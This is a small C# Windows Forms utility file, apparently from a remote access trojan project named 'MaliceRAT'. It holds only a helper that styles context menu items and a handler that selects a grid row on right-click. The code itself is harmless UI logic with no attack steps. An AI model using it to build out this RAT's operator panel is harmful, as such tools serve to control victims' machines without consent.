using System;
using System.Drawing;
using System.Windows.Forms;

namespace MaliceRAT
{
    public static class ContextMenuUtilities
    {
        public static ToolStripMenuItem CreateContextMenuItem(string text, EventHandler onClick)
        {
            ToolStripMenuItem menuItem = new ToolStripMenuItem(text);
            menuItem.BackColor = Color.FromArgb(23, 23, 24);
            menuItem.ForeColor = Color.FromArgb(255, 255, 255);
            menuItem.TextAlign = ContentAlignment.MiddleLeft;
            menuItem.Click += onClick;

            return menuItem;
        }
        public static void GunaTable_MouseDown(object sender, MouseEventArgs e, DataGridView gunaTable)
        {
            if (e.Button == MouseButtons.Right)
            {
                var hti = gunaTable.HitTest(e.X, e.Y);
                gunaTable.ClearSelection();
                if (hti.RowIndex != -1)
                {
                    gunaTable.Rows[hti.RowIndex].Selected = true;
                }
            }
        }
    }
}